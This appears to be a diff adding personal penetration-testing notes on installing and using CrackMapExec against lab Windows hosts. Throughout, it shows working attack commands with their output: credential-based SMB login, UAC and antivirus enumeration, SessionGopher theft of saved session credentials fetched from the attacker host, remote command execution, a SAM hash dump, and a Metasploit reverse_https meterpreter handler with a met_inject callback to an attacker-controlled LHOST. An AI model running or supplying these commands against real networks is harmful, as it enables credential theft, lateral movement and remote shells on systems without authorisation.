@@ -1,0 +1,119 @@
+Install in Kali
+
+apt-get update
+pip install pipenv
+apt-get install -y libssl-dev libffi-dev python-dev build-essential
+pip install --user pipenv
+git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
+cd CrackMapExec && pipenv install
+pipenv shell
+python setup.py install
+
+
+
+When you want to reuse CME, you need to run pipenv each time.
+
+root@kali:~# cd CrackMapExec/
+root@kali:~/CrackMapExec# pipenv shell
+
+(CrackMapExec) root@Microsoft:~/Desktop/CrackMapExec# crackmapexec
+usage: crackmapexec [-h] [-v] [-t THREADS] [--timeout TIMEOUT]
+                    [--jitter INTERVAL] [--darrell] [--verbose]
+                    {smb,winrm,http,mssql,ssh} ...
+
+      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
+     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
+    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
+    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
+    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
+     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|
+
+                                         A swiss army knife for pentesting networks
+                                    Forged by @byt3bl33d3r using the powah of dank memes
+
+                                                      Version: 4.0.1dev
+                                                     Codename: Bug Pr0n
+
+
+Useing CME
+
+(CrackMapExec) root@Microsoft:~/CrackMapExec# crackmapexec smb 192.168.1.32 
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [*] Windows 10.0 Build 17763 x64 (name:MSEDGEWIN10-YO1) (domain:SERVER1) (signing:False) (SMBv1:False)
+
+(CrackMapExec) root@Microsoft:~/CrackMapExec# crackmapexec smb 192.168.1.32 -u DA -p Passw0rd!
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [*] Windows 10.0 Build 17763 x64 (name:MSEDGEWIN10-YO1) (domain:SERVER1) (signing:False) (SMBv1:False)
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [+] SERVER1\DA:Passw0rd! (Pwn3d!)
+
+Check for UAC
+(CrackMapExec) root@Microsoft:~/CrackMapExec# crackmapexec smb -M uac 192.168.1.32 -u DA -p Passw0rd!
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [*] Windows 10.0 Build 17763 x64 (name:MSEDGEWIN10-YO1) (domain:SERVER1) (signing:False) (SMBv1:False)
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [+] SERVER1\DA:Passw0rd! (Pwn3d!)
+UAC         192.168.1.32    445    MSEDGEWIN10-YO1  UAC Status: 1 (UAC Enabled)
+
+Check for AV
+(CrackMapExec) root@Microsoft:~/CrackMapExec# crackmapexec smb  192.168.1.32 -u DA -p Passw0rd! -M enum_avproducts
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [*] Windows 10.0 Build 17763 x64 (name:MSEDGEWIN10-YO1) (domain:SERVER1) (signing:False) (SMBv1:False)
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [+] SERVER1\DA:Passw0rd! (Pwn3d!)
+ENUM_AVP... 192.168.1.32    445    MSEDGEWIN10-YO1  [+] Found Anti-Spyware product:
+
+invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
+
+(CrackMapExec) root@Microsoft:~/CrackMapExec# crackmapexec smb  192.168.1.32 -u DA -p Passw0rd!  -M invoke_sessiongopher --server-port 83
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [*] Windows 10.0 Build 17763 x64 (name:MSEDGEWIN10-YO1) (domain:SERVER1) (signing:False) (SMBv1:False)
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [+] SERVER1\DA:Passw0rd! (Pwn3d!)
+INVOKE_S... 192.168.1.32    445    MSEDGEWIN10-YO1  [+] Executed launcher
+INVOKE_S...                                         [*] Waiting on 1 host(s)
+INVOKE_S... 192.168.1.32                            [*] - - "GET /SessionGopher.ps1 HTTP/1.1" 200 -
+INVOKE_S... 192.168.1.32                            [*] - - "POST / HTTP/1.1" 200 -
+INVOKE_S... 192.168.1.32                            o_
+INVOKE_S... 192.168.1.32                            /  ".   SessionGopher
+INVOKE_S... 192.168.1.32                            ,"  _-"
+INVOKE_S... 192.168.1.32                            ,"   m m
+INVOKE_S... 192.168.1.32                            ..+     )      Brandon Arvanaghi
+INVOKE_S... 192.168.1.32                            `m..m       Twitter: @arvanaghi | arvanaghi.com
+INVOKE_S... 192.168.1.32                            [*] Saved output to SessionGopher-192.168.1.32-_083559.log
+
+Command whoami works on 7 not on 10
+
+CrackMapExec) root@Microsoft:~/CrackMapExec# crackmapexec smb  192.168.1.20 -u DA -p Passw0rd! -x whoami
+SMB         192.168.1.20    445    IEWIN7           [*] Windows 7 Enterprise 7601 Service Pack 1 x64 (name:IEWIN7) (domain:SERVER1) (signing:False) (SMBv1:True)
+SMB         192.168.1.20    445    IEWIN7           [+] SERVER1\DA:Passw0rd! (Pwn3d!)
+SMB         192.168.1.20    445    IEWIN7           [+] Executed command 
+SMB         192.168.1.20    445    IEWIN7           server1\da
+
+Run Commands
+
+-x = CMD
+-X = PS
+
+(CrackMapExec) root@Microsoft:~/CrackMapExec# crackmapexec smb  192.168.1.20 -u DA -p Passw0rd! -X '$PSVersionTable'
+SMB         192.168.1.20    445    IEWIN7           [*] Windows 7 Enterprise 7601 Service Pack 1 x64 (name:IEWIN7) (domain:SERVER1) (signing:False) (SMBv1:True)
+SMB         192.168.1.20    445    IEWIN7           [+] SERVER1\DA:Passw0rd! (Pwn3d!)
+SMB         192.168.1.20    445    IEWIN7           [+] Executed command 
+SMB         192.168.1.20    445    IEWIN7           Name                           Value
+SMB         192.168.1.20    445    IEWIN7           ----                           -----
+SMB         192.168.1.20    445    IEWIN7           CLRVersion                     2.0.50727.8806
+SMB         192.168.1.20    445    IEWIN7           BuildVersion                   6.1.7601.17514
+SMB         192.168.1.20    445    IEWIN7           PSVersion                      2.0
+SMB         192.168.1.20    445    IEWIN7           WSManStackVersion              2.0
+SMB         192.168.1.20    445    IEWIN7           PSCompatibleVersions           {1.0, 2.0}
+SMB         192.168.1.20    445    IEWIN7           SerializationVersion           1.1.0.1
+SMB         192.168.1.20    445    IEWIN7           PSRemotingProtocolVersion      2.1
+
+Sam dump works in Windows 10
+(CrackMapExec) root@Microsoft:~/CrackMapExec# crackmapexec smb  192.168.1.32 -u DA -p Passw0rd! --sam
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [*] Windows 10.0 Build 17763 x64 (name:MSEDGEWIN10-YO1) (domain:SERVER1) (signing:False) (SMBv1:False)
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [+] SERVER1\DA:Passw0rd! (Pwn3d!)
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  [+] Dumping SAM hashes
+SMB         192.168.1.32    445    MSEDGEWIN10-YO1  Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe0de095ba2ddc971889:::
+
+MSF
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 192.168.1.31
+set LPORT 8443
+set exitonsession false
+exploit -j
+
+crackmapexec smb 192.168.1.32 -u DA -p Passw0rd! -M met_inject -o LHOST=192.168.1.31 LPORT=8443
